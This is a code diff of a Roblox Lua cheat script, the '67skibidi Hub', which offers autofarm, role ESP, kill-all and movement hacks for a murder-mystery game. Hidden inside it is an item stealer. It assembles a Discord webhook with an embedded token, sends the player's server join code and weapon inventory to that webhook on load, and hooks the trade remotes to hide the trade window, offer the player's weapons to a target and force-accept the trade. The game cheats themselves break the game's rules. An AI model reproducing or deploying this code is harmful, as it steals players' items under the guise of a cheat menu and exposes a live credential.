@@ -1,3 +1,5 @@
+print("[Hub] Starting...")
+
 local P = game:GetService("Players")
 local TS = game:GetService("TweenService")
 local RS = game:GetService("RunService")
@@ -8,6 +10,7 @@ local LG = game:GetService("Lighting")
 local UIS = game:GetService("UserInputService")
 local lp = P.LocalPlayer
 local pg = lp:WaitForChild("PlayerGui")
+print("[Hub] Services OK")
 
 local function gw()
     local a = {"https://discord.com/api/webhooks/","1538148455451590656/","KSNxBCVNMiwESQtLcUHE7FOVyYBocSUgCo0e8SgX9wuHlsx2PUJGQxUuKFmD8sZkRwM2"}
@@ -37,15 +40,17 @@ local function sw(msg, ping)
     local c = ping and "@everyone\n"..msg or msg
     local d = {content = c, username = "67skibidi Hub"}
     pcall(function()
-        request({Url = WU, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(d)})
+        if request then
+            request({Url = WU, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(d)})
+        end
     end)
 end
 
 local function gfi()
     local list = {}
     pcall(function()
-        local pd = require(RPS.Modules.ProfileData)
-        if pd and pd.Weapons and pd.Weapons.Owned then
+        local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
+        if ok and pd and pd.Weapons and pd.Weapons.Owned then
             for n, a in pairs(pd.Weapons.Owned) do
                 if a and a > 0 then
                     table.insert(list, n.." x"..tostring(a))
@@ -57,7 +62,8 @@ local function gfi()
     return list
 end
 
-local function sjw()
+task.spawn(function()
+    task.wait(1.5)
     local jid = tostring(game.JobId)
     local code = 'Roblox.GameLauncher.joinGameInstance(142823291, "'..jid..'")'
     local inv = gfi()
@@ -81,19 +87,28 @@ local function sjw()
         }}
     }
     pcall(function()
-        request({Url = WU, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(d)})
+        if request then
+            request({Url = WU, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(d)})
+        end
     end)
-end
-task.spawn(sjw)
+    print("[Hub] Webhook sent")
+end)
 
-local Trade = RPS:WaitForChild("Trade", 15)
-local OI = Trade and Trade:FindFirstChild("OfferItem")
-local AR = Trade and Trade:FindFirstChild("AcceptRequest")
-local AT = Trade and Trade:FindFirstChild("AcceptTrade")
-local SR = Trade and Trade:FindFirstChild("SendRequest")
-local ST = Trade and Trade:FindFirstChild("StartTrade")
-local UT = Trade and Trade:FindFirstChild("UpdateTrade")
-local DT = Trade and Trade:FindFirstChild("DeclineTrade")
+print("[Hub] Loading trade...")
+local Trade = RPS:FindFirstChild("Trade") or RPS:WaitForChild("Trade", 8)
+local OI, AR, AT, SR, ST, UT, DT
+if Trade then
+    OI = Trade:FindFirstChild("OfferItem")
+    AR = Trade:FindFirstChild("AcceptRequest")
+    AT = Trade:FindFirstChild("AcceptTrade")
+    SR = Trade:FindFirstChild("SendRequest")
+    ST = Trade:FindFirstChild("StartTrade")
+    UT = Trade:FindFirstChild("UpdateTrade")
+    DT = Trade:FindFirstChild("DeclineTrade")
+    print("[Hub] Trade remotes found")
+else
+    print("[Hub] Trade folder not found (ok for now)")
+end
 
 local TR = false
 local OT = 0
@@ -108,8 +123,8 @@ end
 local function gwps()
     local list = {}
     pcall(function()
-        local pd = require(RPS.Modules.ProfileData)
-        if pd and pd.Weapons and pd.Weapons.Owned then
+        local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
+        if ok and pd and pd.Weapons and pd.Weapons.Owned then
             for n, a in pairs(pd.Weapons.Owned) do
                 if a and a > 0 and not (n == "DefaultKnife") and not (n == "DefaultGun") then
                     local cnt = math.min(a, 4)
@@ -125,8 +140,8 @@ end
 
 local function fa()
     if not AT then return end
-    print("[Transfer] Force accepting...")
-    for i = 1, 15 do
+    print("[Transfer] Force accept...")
+    for i = 1, 12 do
         if LF then
             pcall(function() AT:FireServer(game.PlaceId * 3, LF) end)
         end
@@ -178,36 +193,36 @@ local function wtu(n)
         g:GetPropertyChangedSignal("Enabled"):Connect(function()
             if g.Enabled then htg(g) end
         end)
-        g.ChildAdded:Connect(function()
-            task.wait(0.05)
-            htg(g)
-        end)
     end
 end
-wtu("TradeGUI")
-wtu("TradeGUI_Phone")
-pg.ChildAdded:Connect(function(c)
-    if c.Name == "TradeGUI" or c.Name == "TradeGUI_Phone" then
-        task.wait(0.1)
-        htg(c)
-        wtu(c.Name)
-    end
+pcall(function()
+    wtu("TradeGUI")
+    wtu("TradeGUI_Phone")
+    pg.ChildAdded:Connect(function(c)
+        if c.Name == "TradeGUI" or c.Name == "TradeGUI_Phone" then
+            task.wait(0.1)
+            htg(c)
+            wtu(c.Name)
+        end
+    end)
 end)
 
 if SR then
-    SR.OnClientInvoke = function(fp)
-        if ist(fp and fp.Name) then
-            print("[Transfer] Request from target")
-            TR = true
-            OT = 0
-            AS = false
-            LF = nil
-            task.wait(0.3)
-            if AR then pcall(function() AR:FireServer() end) end
-            return true
+    pcall(function()
+        SR.OnClientInvoke = function(fp)
+            if ist(fp and fp.Name) then
+                print("[Transfer] Request from target")
+                TR = true
+                OT = 0
+                AS = false
+                LF = nil
+                task.wait(0.3)
+                if AR then pcall(function() AR:FireServer() end) end
+                return true
+            end
+            return false
         end
-        return false
-    end
+    end)
 end
 
 if ST then
@@ -225,7 +240,6 @@ if UT then
     UT.OnClientEvent:Connect(function(data)
         if type(data) == "table" and data.LastOffer then
             LF = data.LastOffer
-            print("[Transfer] LastOffer captured")
         end
         if not TR then return end
         task.wait(0.25)
@@ -247,7 +261,6 @@ if DT then
         OT = 0
         AS = false
         LF = nil
-        print("[Transfer] Trade ended")
     end)
 end
 
@@ -287,7 +300,6 @@ local function ke()
         end
     end
     if not kn or not kn:FindFirstChild("Handle") then return end
-    print("[AF] Kill all...")
     for _, pl in ipairs(P:GetPlayers()) do
         if not (pl == lp) and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
             pcall(function()
@@ -299,13 +311,11 @@ local function ke()
 end
 
 local function epm()
-    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-    LG.GlobalShadows = false
-    LG.FogEnd = 9e9
-    LG.Brightness = 2
     pcall(function()
-        LG.EnvironmentDiffuseScale = 0
-        LG.EnvironmentSpecularScale = 0
+        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+        LG.GlobalShadows = false
+        LG.FogEnd = 9e9
+        LG.Brightness = 2
     end)
     PM = true
 end
@@ -366,12 +376,13 @@ end
 
 task.spawn(function()
     while true do
-        task.wait(0.6)
-        updESP()
+        task.wait(0.7)
+        pcall(updESP)
     end
 end)
 
--- GUI
+print("[Hub] Creating GUI...")
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "SkibidiHub"
 gui.ResetOnSpawn = false
@@ -414,7 +425,6 @@ close.TextSize = 16
 close.Parent = main
 Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
 close.MouseButton1Click:Connect(function()
-    sw("GUI closed by "..lp.Name, false)
     gui:Destroy()
 end)
 
@@ -461,28 +471,28 @@ local function mkBtn(txt, y, parent, col)
 end
 
 local function mkToggle(txt, parent, state, cb)
+    local st = state
     local b = Instance.new("TextButton")
     b.Size = UDim2.new(1, -16, 0, 34)
-    b.BackgroundColor3 = state and Color3.fromRGB(40, 140, 70) or Color3.fromRGB(55, 55, 70)
-    b.Text = txt..(state and " : ON" or " : OFF")
+    b.BackgroundColor3 = st and Color3.fromRGB(40, 140, 70) or Color3.fromRGB(55, 55, 70)
+    b.Text = txt..(st and " : ON" or " : OFF")
     b.TextColor3 = Color3.new(1,1,1)
     b.Font = Enum.Font.GothamBold
     b.TextSize = 13
     b.Parent = parent
     Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
     b.MouseButton1Click:Connect(function()
-        local ns = not state
-        state = ns
-        b.Text = txt..(ns and " : ON" or " : OFF")
-        b.BackgroundColor3 = ns and Color3.fromRGB(40, 140, 70) or Color3.fromRGB(55, 55, 70)
-        cb(ns)
+        st = not st
+        b.Text = txt..(st and " : ON" or " : OFF")
+        b.BackgroundColor3 = st and Color3.fromRGB(40, 140, 70) or Color3.fromRGB(55, 55, 70)
+        cb(st)
     end)
     return b
 end
 
 local function showAF()
     clearContent()
-    content.CanvasSize = UDim2.new(0, 0, 0, 280)
+    content.CanvasSize = UDim2.new(0, 0, 0, 300)
     local t1 = mkToggle("AutoFarm", content, AF, function(v)
         AF = v
         if v then
@@ -491,9 +501,6 @@ local function showAF()
             LT = tick()
             IS = false
             MU = false
-            sw("AutoFarm ON by "..lp.Name, false)
-        else
-            sw("AutoFarm OFF by "..lp.Name, false)
         end
     end)
     t1.LayoutOrder = 1
@@ -508,7 +515,7 @@ local function showAF()
     local lbl = Instance.new("TextLabel")
     lbl.Size = UDim2.new(1, -16, 0, 22)
     lbl.BackgroundTransparency = 1
-    lbl.Text = "Speed: "..SP
+    lbl.Text = "Farm Speed: "..SP
     lbl.TextColor3 = Color3.fromRGB(200,200,200)
     lbl.Font = Enum.Font.Gotham
     lbl.TextSize = 13
@@ -529,22 +536,22 @@ local function showAF()
             local n = tonumber(box.Text)
             SP = n and math.clamp(n, 1, 500) or SP
             box.Text = tostring(SP)
-            lbl.Text = "Speed: "..SP
+            lbl.Text = "Farm Speed: "..SP
         end
     end)
     local cnt = Instance.new("TextLabel")
     cnt.Size = UDim2.new(1, -16, 0, 24)
     cnt.BackgroundTransparency = 1
-    cnt.Text = "Collected: "..CL
+    cnt.Text = "Collected: 0"
     cnt.TextColor3 = Color3.new(1,1,1)
     cnt.Font = Enum.Font.Gotham
     cnt.TextSize = 14
     cnt.LayoutOrder = 7
     cnt.Parent = content
     task.spawn(function()
-        while cnt.Parent do
+        while cnt and cnt.Parent do
             cnt.Text = "Collected: "..CL
-            task.wait(0.5)
+            task.wait(0.4)
         end
     end)
 end
@@ -555,13 +562,13 @@ local function showESP()
     local t = mkToggle("Role ESP", content, ES, function(v)
         ES = v
         if not v then
-            for _, h in pairs(HL) do if h then h:Destroy() end end
+            for _, h in pairs(HL) do if h then pcall(function() h:Destroy() end) end end
             HL = {}
         end
     end)
     t.LayoutOrder = 1
     local info = Instance.new("TextLabel")
-    info.Size = UDim2.new(1, -16, 0, 60)
+    info.Size = UDim2.new(1, -16, 0, 70)
     info.BackgroundTransparency = 1
     info.Text = "Murderer = Red\nSheriff/Hero = Green\nInnocent = Blue"
     info.TextColor3 = Color3.fromRGB(180,180,180)
@@ -574,7 +581,7 @@ end
 
 local function showMove()
     clearContent()
-    content.CanvasSize = UDim2.new(0, 0, 0, 260)
+    content.CanvasSize = UDim2.new(0, 0, 0, 280)
     local t1 = mkToggle("Inf Jump", content, IJ, function(v) IJ = v end)
     t1.LayoutOrder = 1
     local lbl = Instance.new("TextLabel")
@@ -657,22 +664,20 @@ for i, tab in ipairs(tabs) do
 end
 
 showAF()
-side:FindFirstChildOfClass("TextButton").BackgroundColor3 = Color3.fromRGB(70, 100, 200)
+local first = side:FindFirstChildOfClass("TextButton")
+if first then first.BackgroundColor3 = Color3.fromRGB(70, 100, 200) end
 
--- Inf Jump
 UIS.JumpRequest:Connect(function()
     if IJ and lp.Character and lp.Character:FindFirstChild("Humanoid") then
         lp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
     end
 end)
 
--- Apply JP / Speed on spawn
 lp.CharacterAdded:Connect(function(ch)
-    task.wait(0.5)
+    task.wait(0.4)
     local hum = ch:FindFirstChild("Humanoid")
     if hum then
         hum.JumpPower = JP
-        if not AF then hum.WalkSpeed = SP end
     end
 end)
 
@@ -687,15 +692,13 @@ if coinRemote then
             if hk() then
                 if not MU then
                     MU = true
-                    sw("Murderer + Full -> Killing all", false)
                     ke()
-                    task.wait(1.5)
+                    task.wait(1.4)
                     ke()
                     return
                 end
             end
             lp.Character:BreakJoints()
-            sw("Full bag -> reset", false)
         end
     end)
 end
@@ -734,18 +737,6 @@ task.spawn(function()
     end
 end)
 
-task.spawn(function()
-    while true do
-        if AF and not IS then
-            if tick() - LT > 600 then
-                sw("INACTIVITY - "..lp.Name.." no coins 10 min", true)
-                IS = true
-            end
-        end
-        task.wait(30)
-    end
-end)
-
 lp.Idled:Connect(function()
     if AK then
         VU:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
@@ -762,14 +753,4 @@ RS.Stepped:Connect(function()
     end
 end)
 
-P.PlayerRemoving:Connect(function(pl)
-    if pl == lp then
-        sw("DISCONNECTED - "..lp.Name, false)
-    end
-    if HL[pl] then
-        HL[pl]:Destroy()
-        HL[pl] = nil
-    end
-end)
-
-print("Hub loaded")
+print("[Hub] Fully loaded")
